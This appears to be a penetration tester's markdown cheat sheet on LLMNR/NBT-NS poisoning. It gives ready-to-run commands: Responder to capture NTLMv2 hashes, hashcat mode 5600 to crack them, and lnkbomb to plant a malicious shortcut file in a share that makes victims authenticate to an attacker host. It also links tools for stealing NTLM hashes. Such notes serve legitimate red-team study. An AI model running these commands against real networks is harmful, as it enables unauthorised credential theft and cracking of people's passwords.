## LLMNR

LLMNR is used to identify hosts when DNS fails
Originally NBT-NS
Key flaw: Services utilize a username and NTLMv2 hash when responded to maliciously

### LMNR Poisoning

When resource is asked for via broadcast over link local multicast name resolution (LLMNR), we can respond and ask for hash

### Responder

```responder
sudo responder -I <interface> -dwP
```

```hashcat-ntlmv2
hashcat -m 5600 <hashes.txt> <wordlist.txt>
```

Use lnkbomb for malicious lnk generation (automatically puts into a share specified)

https://github.com/dievus/lnkbomb

```lnkbomb
python lnkbomb.py -a <ATTACKER> -t <TARGET> -s DocumentsShare -w
```

-w for windows and -l for linux targets

https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ Lists lots of ways to get NTLM hashes

https://github.com/Greenwolf/ntlm_theft.git is useful for geenrating various attack types